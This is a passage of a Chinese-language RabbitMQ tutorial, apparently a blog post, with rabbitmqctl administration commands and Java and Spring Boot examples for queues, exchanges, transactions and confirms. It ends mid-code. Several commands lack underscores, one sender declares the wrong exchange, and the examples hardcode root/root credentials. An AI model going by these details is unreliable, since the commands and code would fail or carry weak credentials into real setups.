&#123;插件名&#125;\n用户管理浏览器访问管控台：\n默认用户密码均为 guest但只能本机登录，否则报错User can only log in via localhost\n添加用户 rabbitmqctl add_user &#123;username&#125; &#123;password&#125;删除用户 rabbitmqctl delete_user &#123;username&#125;修改密码 rabbitmqctl change_password &#123;username&#125; &#123;newpassword&#125;设置用户角色 rabbitmqctl set_user_tags &#123;username&#125; &#123;tag&#125;\ntag参数表示用户角色取值为：management、monitoring、policymaker、administrator角色详解：\nmanagement：用户可以通过AMQP做的任何事外加\n\n列出自己可以通过AMQP登入的 virtual hosts\n查看自己的 virtual hosts 中的 queues、exchanges 和 bindings\n查看和关闭自己的 channels 和 connections\n查看有关自己的 virtual hosts 的“全局”的统计信息，包含其他用户在这些 virtual hosts 中的活动\n\npolicymaker：management 可以做的任何事外加\n\n查看、创建和删除自己的 virtual hosts 所属的 policies 和 parameters\n\nmonitoring：management 可以做的任何事外加\n\n列出所有的 virtual hosts ，包括他们不能登录的 virtual hosts\n查看其他用户的 connections 和 channels\n查看节点级别的数据如 clustering 和 memory 使用情况\n查看真正的关于所有 virtual hosts 的全局统计信息\n\nadministrator：policymaker 和 monitoring 可以做的任何事外加\n\n创建和删除 virtual hosts\n查看、创建和删除 users\n查看、创建和删除 permissions\n关闭其他用户的 connections\n\n权限管理授权命令 rabbitmqctl set permissions [-p vhostpath] &#123;user&#125; &#123;conf&#125; &#123;write&#125; &#123;read&#125;-p vhostpath:用于指定一个资源的命名空间，例如 -p &#x2F; 表示根路径命名空间user：用于指定要为哪个用户授权填写用户名conf：一个正则表达式match 哪些配置资源能被该用户配置write：一个正则表达式match 哪些配置资源能被该用户写read：一个正则表达式match 哪些配置资源能被该用户读\n查看指定命名空间下的用户权限 rabbitmqctl list permissions [vhostpath]\n查看指定用户下的权限 rabbitmqctl list user_permissions &#123;username&#125;\nvhost管理vhost是RabbitMQ中的一个命名空间，可以限制消息存放位置，利用这个命名空间进行权限的控制。类似windows文件夹，在不同文件夹存放不同文件。\n添加vhost rabbitmqctl add vhost temp删除vhost rabbitmqctl delete vhost &#123;name&#125;\n消息的发送和接收消息发送和接收机制所有的mq产品从模型抽象上来说都是一样的过程：消费者订阅某个队列。生产者创建消息，然后发布到队列中，最后将消息发送到监听的消费者。\n\n\nMessage：消息，消息是不具体的，它由消息头和消息体组成。消息体是不透明的，而消息头则由一系列可选属性组成，这些属性包括 routing-key （路由键）、 priority （相对于其他消息的优先权）、 delivery-mode （指出该消息可能需要持久性存储）等。\nPublisher：消息的生产者，也是一个向交换器发布消息的客户端程序。\nExchange：交换机，用来接收生产者发送的消息并将这些消息路由给服务器中的队列。\nBinging：绑定，用于消息队列和交换器之间的关联。一个绑定就是基于路由键将交换器和消息队列连接起来的路由规则，所以可以将交换器理解成一个由绑定构成的路由表。\nQueue：消息队列，用来保存消息直到发送给消费者。他是消息的容器，也是消息的终点。一个消息可以投入一个或多个队列。消息一直在队列里面，等待消费者连接到这个队列将其取走。\nConnection：网络连接，比如一个TCP连接。\nChannel：信道，多路复用连接中的一条独立的双向数据流通道。信道是建立在真实的TCP连接内的虚拟连接，AMQP命令都是通过信道发送出去的，不管是发布消息、订阅队列还是接收消息，都是通过信道完成的。因为对于操作系统来说，建立和销毁TCP连接开销较大，所以引入信道的概念，以复用一条TCP连接。\nConsumer：信息的消费者，表示一个从消息队列中取得消息的客户端应用程序。\nVirtual Host：虚拟主机，表示一批交换器、消息队列和相关对象。虚拟主机是共享相同的身份认证和加密环境的独立服务器域。每个vhost本质是一个缩小版的RabbitMQ服务器，有自己的队列、交换器、绑定和权限机制。vhost是AMQP概念的基础，必须在连接时指定，RabbitMQ默认的vhost是&#x2F;。\nBroker：表示消息队列服务器实体。\n\nAMQP中的消息路由生产者将消息发布到Exchange上，消息最终到达队列并被消费者接收，而binding决定交换器的消息应该发送到哪个队列。\nExchange类型Exchange分发消息时根据类型的不同分发策略有区别，有四种类型：direct、fanout、topic、headers。headers 匹配AMQP消息的 header 而不是路由键，此外 headers 交换器和 direct 交换器完全一致，但性能差很多。几乎用不到了。\n\ndirect消息中的路由键如果和 Binding 中的 binding key 一致，交换器就将消息发送到对应的队列中。路由键与队列名完全一致。他是完全匹配、单播模式。如果没有 binding key 与路由键一致，数据会丢失。\n\nfanout每个发到 fanout 类型交换器的消息都会分到所有绑定的队列上去。fanout 交换器不处理路由键，只是简单的将队列绑定到交换器上，每个发送到交换器的消息会被转发到与该交换器绑定的所有队列上。类似广播，fanout 类型转发消息是最快的。\n\ntopictopic 交换器通过匹配模式分配消息的路由键属性，将路由键和某个模式进行匹配，此时队列需要绑定到一个模式上。他将路由键和绑定键的字符串切分成单词，这些单词之间用点隔开。它同样会识别两个通配符：’#’和’*‘。# 匹配0或多个单词，* 匹配一个单词。它也是一种广播，但是是有一定条件的广播。\n\n\nJava发送和接收Queuemaven依赖\n&lt;dependency&gt;  &lt;groupId&gt;com.rabbitmq&lt;/groupId&gt;  &lt;artifactId&gt;amqp-client&lt;/artifactId&gt;  &lt;version&gt;5.14.2&lt;/version&gt;&lt;/dependency&gt;\n\n消息发送：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class Send &#123;    public static void main(String[] args) &#123;        //创建连接工厂对象        ConnectionFactory factory = new ConnectionFactory();        //配置RabbitMQ的连接相关信息        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;//定义连接对象        Channel channel = null;//定义通道对象        try &#123;            connection = factory.newConnection();//实例化连接对象            channel = connection.createChannel();// 实例化通道对象            String message = &quot;hello MQ!&quot;;            //创建队列，名为myQueue            /*            参数1为 队列名            参数2为 是否持久化队列            参数3为 是否排外 如果排外则这个队列只允许一个消费者监听            参数4为 是都自动删除队列 为true表示当队列中没有消息，也没有消费者连接时会自动删除这个队列            参数5为 队列的一些属性设置，通常为null            注意：                1. 声明队列时，队列名称如果已经存在则放弃声明。如果不存在，则会声明一个新的队列                2. 队列名可以取值任意，但是要与消息接收时完全一致                3. 这行代码是可有可无的，但是一定要在发送消息前确认队列名称已经存在，否则会出现问题             */            channel.queueDeclare(&quot;myQueue&quot;, true, false, false, null);            //发送消息到指定队列            /*            参数1为 交换机名称，为空不使用交换机            参数2为 队列名或routing，当指定交换机名称后，这个值就是routingKey            参数3为 消息属性 通常为空            消息4为 具体的消息的字节数组            注意：队列名必须与接收时完全一致             */            channel.basicPublish(&quot;&quot;, &quot;myQueue&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n\n连接时，使用的端口号为 5672 。15672 是访问web时使用的。另外，注意用户是否有连接权限，以及端口是否开放。\n\n消息接收:\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class Receive &#123;    public static void main(String[] args) &#123;        //创建连接工厂对象        ConnectionFactory factory = new ConnectionFactory();        //配置RabbitMQ的连接相关信息        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;//定义连接对象        Channel channel = null;//定义通道对象        try &#123;            connection = factory.newConnection();//实例化连接对象            channel = connection.createChannel();// 实例化通道对象            channel.queueDeclare(&quot;myQueue&quot;, true, false, false, null);            //接收消息            /*            参数1为 当前消费者需要监听的队列名称 队列名必须要与发送时队列名完全一致            参数2为 消息是否自动确认。true表示自动确认，接受完消息会自动将消息从队列中溢出            参数3为 消息接收者的标签，用于当多个消费者同时监听一个队列时区分不同消费者，通常为空字符串            参数4为 消息接收的回调方法，这个方法具体完成对消息的处理代码            注意：使用了 basicConsume 方法后，会启动一个线程持续监听队列，如果队列中有新的数据进入，会自动接收消息                因此不能关闭通道和连接对象             */            channel.basicConsume(&quot;myQueue&quot;, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                //消息的具体接收和处理方法                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);            //不能关闭通道和连接，关闭可能会造成接收时抛出异常或无法接收消息            //channel.close();            //connection.close();        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\nJava绑定Exchange发送和接收消息AMQP协议中的核心思想是生产者和消费者解耦，生产者从不直接将消息发送给队列。生产者通常不知道是否一个消息会被发送到队列中，只是将消息发送到一个交换机。由 Exchange 来接收，然后 Exchange 根据特定的策略转发到 Queue 进行存储。Exchange 类似一个交换机，将各个消息分发到对应的队列。\n实际应用中只需要定义好 Exchange 的路由策略。生产者只面向 Exchange 发布消息，消费者只面向 Queue 消费消息，Exchange 定义消息的路由，将各个层面的消息隔离开，降低了整体的耦合度。\ndirect-消息发送与接收消息发送：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendDirect &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello direct MQ!&quot;;            channel.queueDeclare(&quot;myDirectQueue&quot;, true, false, false, null);            //声明一个交换机            /*            参数1为 交换机的名称            参数2为 交换机的类型，取值 direct、fanout、topic、headers            参数3为 是否为持久化的交换机            注意：                声明交换机时，如果这个交换机已经存在，则会放弃声明。如果不存在，则声明交换机                这行代码是可有可无的，但是使用前必须确保这个交换机被声明             */            channel.exchangeDeclare(&quot;directExchange&quot;, &quot;direct&quot;, true);            //将队列绑定到交换机            /*            参数1为 队列的名称            参数2为 交换机名称            参数3为 消息的RoutingKey（BindingKey）            注意：                在进行队列和交换机的绑定时，必须确保交换机和队列已经成功声明             */            channel.queueBind(&quot;myDirectQueue&quot;, &quot;directExchange&quot;, &quot;directRoutingKey&quot;);            //发送消息到指定队列            /*            参数1为 交换机名称            参数2为 消息的RoutingKey 如果消息的RoutingKey和某个队列与交换机绑定的RoutingKey一致，那么这个消息就会发送到指定队列中            注意：                发送消息时必须确保交换机已经创建并且确保已经正确绑定到某个队列             */            channel.basicPublish(&quot;directExchange&quot;, &quot;directRoutingKey&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n消息接收：\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class ReceiveDirect &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();                        channel.queueDeclare(&quot;myDirectQueue&quot;, true, false, false, null);            channel.exchangeDeclare(&quot;directExchange&quot;, &quot;direct&quot;, true);            channel.queueBind(&quot;myDirectQueue&quot;, &quot;directExchange&quot;, &quot;directRoutingKey&quot;);            /*            监听某个队列并获取队列中的数据            注意：                当前被监听的队列必须已经存在并正确地绑定到了某个交换机中             */            channel.basicConsume(&quot;myDirectQueue&quot;, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\nfanout-消息发送与接收类似电视调频道，需要先调到指定频道才能看想要的节目。所以需要消费者先监听，才能接收到消息。\n消息接收：\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class ReceiveFanout &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            /*            由于 fanout 类型的交换机的消息是类似于广播的模式，它不需要绑定 RoutingKey            而又可能会有很多个消费者来接收这个交换机中的数据，因此创建队列是要创建一个随机的队列名称            没有参数的 queueDeclare方法会创建一个名字随机的队列            这个队列的数据是非持久的，是排外的（同时最多只允许有一个消费者监听当前队列），会自动删除（当没有任何消费者监听队列时，这个队列会自动删除）            getQueue方法用于获取这个随机的队列名             */            String queueName = channel.queueDeclare().getQueue();            channel.exchangeDeclare(&quot;fanoutExchange&quot;, &quot;fanout&quot;, true);            //将这个随机的队列绑定到交换机中，由于是fanout类型的交换机，因此不需要指定RoutingKey进行绑定            channel.queueBind(queueName, &quot;fanoutExchange&quot;, &quot;&quot;);            /*            监听某个队列并获取队列中的数据            注意：                当前被监听的队列必须已经存在并正确地绑定到了某个交换机中             */            channel.basicConsume(queueName, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n消息发送：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendFanout &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello fanout MQ!&quot;;            /*            由于使用了fanout类型的交换机，因此消息接收方可能会有多个，不建议在消息发送时创建队列，以及绑定队列            建议在消费者中创建队列并绑定交换机            但是发送消息时至少应该确保交换机存在             *///            channel.queueDeclare(&quot;myDirectQueue&quot;, true, false, false, null);//            channel.queueBind(&quot;myDirectQueue&quot;, &quot;directExchange&quot;, &quot;directRoutingKey&quot;);            channel.exchangeDeclare(&quot;directExchange&quot;, &quot;direct&quot;, true);            channel.basicPublish(&quot;fanoutExchange&quot;, &quot;&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n明确指定队列名称并进行了和交换机的绑定，可以保证fanout类型的消息不会丢失但是这么写没有意义，因为消费者最终可能有很多，不能让所有消费者监听同一个队列\ntopic-消息发送与接收接收消息：\npackage org.example.rabbitmq;import com.rabbitmq.client.*;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class ReceiveTopic &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            channel.queueDeclare(&quot;topicQueue&quot;,true,false,false,null);            channel.exchangeDeclare(&quot;topicExchange&quot;, &quot;topic&quot;, true);            channel.queueBind(&quot;topicQueue&quot;, &quot;topicExchange&quot;, &quot;aa.*&quot;);            channel.basicConsume(&quot;topicQueue&quot;, true, &quot;&quot;, new DefaultConsumer(channel) &#123;                @Override                public void handleDelivery(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, byte[] body) throws IOException &#123;                    String message = new String(body, StandardCharsets.UTF_8);                    System.out.println(&quot;成功接收消息：&quot; + message);                &#125;            &#125;);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125;    &#125;&#125;\n\n发送消息：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendTopic &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello topic MQ!&quot;;            channel.exchangeDeclare(&quot;topicExchange&quot;, &quot;topic&quot;, true);            channel.basicPublish(&quot;topicExchange&quot;, &quot;aa.a&quot;, null, message.getBytes(StandardCharsets.UTF_8));            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\nfanout与topic使用场景对比topic 类型的交换机和 fanout 类型的交换机一样，都是一对多的交换机类型，都可以实现将一个消息同时发送给多个队列 \nfanout 更适合于使用在一个功能不同的进程来获取数据例如手机app中的消息推送，一个app可能会有很多用户安装，然后他们都会启动一个随机队列来接受自己的数据\ntopic 更适合不同功能模块来接收同一个消息例如商城下单成功后需要发送消息到队列中假如 RoutingKey 为 order.success 。物流系统监听 order.* ；发票系统监听 order.*\nTopic 可以使用随机的队列名也可以使用明确的队列名，但如果功能比较重要，建议使用明确的队列名并要求持久化的队列。\n事务消息事务消息和数据库的事务类似，只是MQ中的消息要保证消息是否全部发送成功，防止信息都是的一种策略。\nRabbitMQ有两种方式来解决这个问题：\n\n通过AMQP提供的事务机制实现\n使用发送者确认模式实现（效率要高一些）\n\n启用事务发送消息：\npackage org.example.rabbitmq;import com.rabbitmq.client.Channel;import com.rabbitmq.client.Connection;import com.rabbitmq.client.ConnectionFactory;import java.io.IOException;import java.nio.charset.StandardCharsets;import java.util.concurrent.TimeoutException;public class SendTransaction &#123;    public static void main(String[] args) &#123;        ConnectionFactory factory = new ConnectionFactory();        factory.setHost(&quot;0.0.0.0&quot;);        factory.setPort(5672);        factory.setUsername(&quot;root&quot;);        factory.setPassword(&quot;root&quot;);        Connection connection = null;        Channel channel = null;        try &#123;            connection = factory.newConnection();            channel = connection.createChannel();            String message = &quot;hello Transaction!&quot;;            channel.queueDeclare(&quot;transactionQueue&quot;, true, false, false, null);            channel.exchangeDeclare(&quot;transactionExchange&quot;, &quot;direct&quot;, true);            channel.queueBind(&quot;transactionQueue&quot;, &quot;transactionExchange&quot;, &quot;transactionRoutingKey&quot;);            //启动一个事务，启动事务后所有写入到队列的消息必须显式地调用 txCommit 提交事务或txRollback 回滚事务            channel.txSelect();            channel.basicPublish(&quot;transactionExchange&quot;, &quot;transactionRoutingKey&quot;, null, message.getBytes(StandardCharsets.UTF_8));            channel.basicPublish(&quot;transactionExchange&quot;, &quot;transactionRoutingKey&quot;, null, message.getBytes(StandardCharsets.UTF_8));            //提交事务，如果调用 txSelect 启动了事务，必须显示调用事物的提交            //否则消息不会真正写入队列，提交后会将内存中的消息写入队列并释放内存            channel.txCommit();            System.out.println(&quot;成功发送消息：&quot; + message);        &#125; catch (IOException | TimeoutException e) &#123;            e.printStackTrace();        &#125; finally &#123;            try &#123;                if (channel != null) &#123;                    //回滚事务，放弃当前事务中所有没有提交的消息，释放内存                    channel.txRollback();                    channel.close();                &#125;                if (connection != null) &#123;                    connection.close();                &#125;            &#125; catch (IOException | TimeoutException e) &#123;                e.printStackTrace();            &#125;        &#125;    &#125;&#125;\n\n\n当消费者开启事务后，即使不做提交。依然可以获取队列中的消息并且消息从队列中移除暂时 事务对接收者没有影响\n\n发送者确认模式Confirm 发送方确认模式使用和事务类似，也是通过设置 channel 进行发送方确认的，最终达到确保所有消息全部发送成功的目的。\n代码大部分相同（加减几行的区别），就不单独贴代码块了。上面大段重复好难受\n启用发送者确认模式channel.confirmSelect();\n方式一：channel.waiForConfirms() 普通发送方确认模式可以有一个参数，超时时间（毫秒值）\n会阻塞线程等待服务返回响应，用于是否消息发送成功，如果服务器确认消息已经发送完成则返回true，都则返回false可以给这个方法一个毫秒值用于确认我们的需要等待服务确认的时间如果超过了指定时间以后则会抛出异常 InterruptedException 表示服务器出现了问题需要补发消息或将消息缓存到 redis 中，稍后利用定时任务补发无论返回false还是抛出异常，消息都有可能发送成功或发送失败如果要求这个消息一定要发送到队列，那么可以采用消息补发（重新发送）\n方式二：channel.waitForConfirmsOrDie() 批量确认模式它会向服务中确认之前当前通道中发送的所有消息是否已经全部写入成功这个方法没有返回值，如果服务器中有一条消息没有能够成功或向服务器发送确认时服务不可访问，都被认定为消息发送失败。可能有消息没有发送成功，需要进行消息补发如果无法向服务器获取确认信息，那么方法会抛出 InterruptedException 异常，这时就需要补发这个方法也可以指定超时时间，同上\n\n批量消息确认的速度比普通消息确认要快，但是一旦出现需要补发的情况，不能确认具体是哪条消息没有发送完成，需要将本次所有消息全部补发\n\n方式三：channel.addConfirmListener() 异步确认模式\n使用方法：\n/*异步消息确认监听器，需要在发送消息前启动 */channel.addConfirmListener(new ConfirmListener() &#123;    //消息确认以后的回调方法    /*    参数1 被确认的消息编号 从1开始自动递增标记当前是第几条消息    参数2 当前消息是否同时确认了多个    注意：如果参数2为true，则表示本次确认同时确认了多条消息；如果为false，则表示之确认了当前编号的消息     */    @Override    public void handleAck(long l, boolean b) throws IOException &#123;    &#125;    //消息没有确认的回调方法，执行消息补发之类的操作    /*    参数1 没有被确认的消息编号 从1开始自动递增标记当前是第几条消息    参数2 当前消息是否同时没有确认了多个    注意：如果参数2为true 则表示小于当前编号的所有消息可能都没有发送成功，需要补发；为false 则表示当前编号的消息没有发送成功，需要补发     */    @Override    public void handleNack(long l, boolean b) throws IOException &#123;    &#125;&#125;);\n\n消费者确认模式为保证消息从队列可靠地到达消费者，消费者可以在队列声明时指定 noAck 参数，为 false 时，RabbitMQ会等待消费者显式发回ack信号后才从内存（和磁盘，如果持久化的话）中移去消息。否则，RabbitMQ会在队列中的消息被消费后立即删除它。\n手动确认主要使用以下方法：\nbasicAck() 用于肯定确认basicRecover() 路由不成功的消息，使用recover重新发送到队列basicReject() 拒收消息，可以设置是否放回到队列中。并且只能一次拒绝一条消息。批量拒绝消息使用 basicNack()basicNack() 可以一次拒绝多条消息\n//获取当前消息是否被接收过一次，false没被接受过，true被接收过，也可能处理完成，需要进行消息防重复处理envelope.isRedeliver();//获取消息的编号long deliveryTag = envelope.getDeliveryTag();//获取当前内部类的通道Channel c = this.getChannel();//手动确认这个消息，确认以后表示当前消息已经成功处理了，需要从队列中移除//这个方法应该在当前消息处理程序全部完成后执行//参数1 消息的序号//参数2 为是否确认多个，为true表示确认小等于当前编号的所有消息，false单个确认，确认当前消息//注意：如果启动事务，而消息确认模式为手动确认。那么必须要提交事务，否则即使调用确认调用方法，消息也不回从队列中移除c.basicAck(deliveryTag,true);\n\nspringboot集成RabbitMQ和上面单独使用Java进行收发消息的流程基本一致\nmaven依赖\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt;&lt;/dependency&gt;\n\n配置文件\nspring.rabbitmq.host=0.0.0.0spring.rabbitmq.port=5672spring.rabbitmq.username=rootspring.rabbitmq.password=root\n\n配置类（用于声明队列和交换机，以及绑定队列和交换机）\npackage com.example.springboottext.rabbitmq.config;import org.springframework.amqp.core.*;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class RabbitMQConfig &#123;    //配置一个Direct类型的交换机    @Bean    public DirectExchange directExchange() &#123;        return new DirectExchange(&quot;bootDirectExchange&quot;, true, false);    &#125;    //配置一个队列    @Bean    public Queue directQueue() &#123;        return new Queue(&quot;bootDirectQueue&quot;, true, false, false, null);    &#125;    /**     * 配置一个队列和交换机的绑定     *     * @param directQueue    需要绑定的队列对象，参数名必须要和某个@Bean的方法名完全相同以进行自动注入     * @param directExchange 需要绑定的交换机对象，参数名必须要和某个@Bean的方法名完全相同以进行自动注入     * @return     */    @Bean    public Binding directBinding(Queue directQueue, DirectExchange directExchange) &#123;        //完成绑定        // 参数1 需要绑定的队列        // 参数2 需要绑定的交换机        // 参数3 绑定时的RoutingKey        return BindingBuilder.bind(directQueue).to(directExchange).with(&quot;RoutingKey&quot;);    &#125;    //配置一个Fanout类型的交换机    @Bean    public FanoutExchange fanoutExchange() &#123;        return new FanoutExchange(&quot;fanoutExchange&quot;);    &#125;    //配置一个Topic类型的交换机    @Bean    public TopicExchange topicExchange() &#123;        return new TopicExchange(&quot;topicExchange&quot;);    &#125;&#125;\n\nService类（发送消息）\npackage com.example.springboottext.rabbitmq.service.impl;import com.example.springboottext.rabbitmq.service.SendService;import org.springframework.amqp.core.AmqpTemplate;import org.springframework.stereotype.Service;import javax.annotation.Resource;@Service(&quot;sendService&quot;)public class SendServiceImpl implements SendService &#123;    //注入amqp的模板类，里用这个对象来发送和接受消息    @Resource    private AmqpTemplate amqpTemplate;    @Override    public void sendMessage(String message) &#123;        /*        发送消息        参数1 交换机名        参数2 RoutingKey        参数3 具体消息         */        amqpTemplate.convertAndSend(&quot;bootDirectExchange&quot;, &quot;RoutingKey&quot;, message);    &#125;    @Override    public void sendFanoutMessage(String message) &#123;        amqpTemplate.convertAndSend(&quot;fanoutExchange&quot;, &quot;&quot;, message);    &#125;    @Override    public void sendTopicMessage(String message) &#123;        amqpTemplate.convertAndSend(&quot;topicExchange&quot;, &quot;aa&quot;, message);    &#125;&#125;\n\nService类（接收消息）\npackage com.example.springboottext.rabbitmq.service.impl;import com.example.springboottext.rabbitmq.service.ReceiveService;import org.springframework.amqp.core.AmqpTemplate;import org.springframework.amqp.rabbit.annotation.Exchange;import org.springframework.amqp.rabbit.annotation.Queue;import org.springframework.amqp.rabbit.annotation.QueueBinding;import org.springframework.amqp.rabbit.annotation.RabbitListener;import org.springframework.stereotype.Service;import javax.annotation.Resource;@Service(&quot;receiveService&quot;)public class ReceiveServiceImpl implements ReceiveService &#123;    @Resource    private AmqpTemplate amqpTemplate;    /**     * 这个接收不是不间断的接收消息，每执行一次只能接收一次。如果有新消息，不会自动接收     */    @Override    public void receive() &#123;        String bootDirectQueue = (String) amqpTemplate.receiveAndConvert(&quot;bootDirectQueue&quot;);        System.out.println(bootDirectQueue);    &#125;    /**     * @param message 接收到的具体消息数据     *                注意：如果当前监听方法正常结束Spring会自动确认消息，如果出现异常则不会确认消息     *                因此在消息处理时，应该做好消息的防重复处理     * @RabbitListener 注解用于标记当前方法是一个RabbitMQ的消息监听方法，作用是持续性的自动接收消息     * 这个方法不需要手动调用，Spring会自动运行这个监听     * queues 用于指定一个已经存在的队列名，用于进行队列的监听     */    @Override    @RabbitListener(queues = &quot;bootDirectQueue&quot;)    public void directReceive(String message) &#123;        System.out.println(message);    &#125;    @Override    @RabbitListener(bindings = &#123;            //@QueueBinding 注解完成队列和交换机的绑定            @QueueBinding(                    value = @Queue(), //@Queue 创建一个队列（没有指定参数则表示创建一个随机队列                    exchange = @Exchange(name = &quot;fanoutExchange&quot;, type = &quot;fanout&quot;) //@Exchange 创建一个交换机            )&#125;)    public void fanoutReceive01(String message) &#123;        System.out.println(&quot;01--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(),                    exchange = @Exchange(name = &quot;fanoutExchange&quot;, type = &quot;fanout&quot;)            )&#125;)    public void fanoutReceive02(String message) &#123;        System.out.println(&quot;02--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = @Queue(&quot;topic01&quot;),                    key = &quot;aa&quot;,                    exchange = @Exchange(name = &quot;topicExchange&quot;, type = &quot;topic&quot;))    &#125;)    public void topicReceive01(String message) &#123;        System.out.println(&quot;01--&quot; + message);    &#125;    @Override    @RabbitListener(bindings = &#123;            @QueueBinding(                    value = 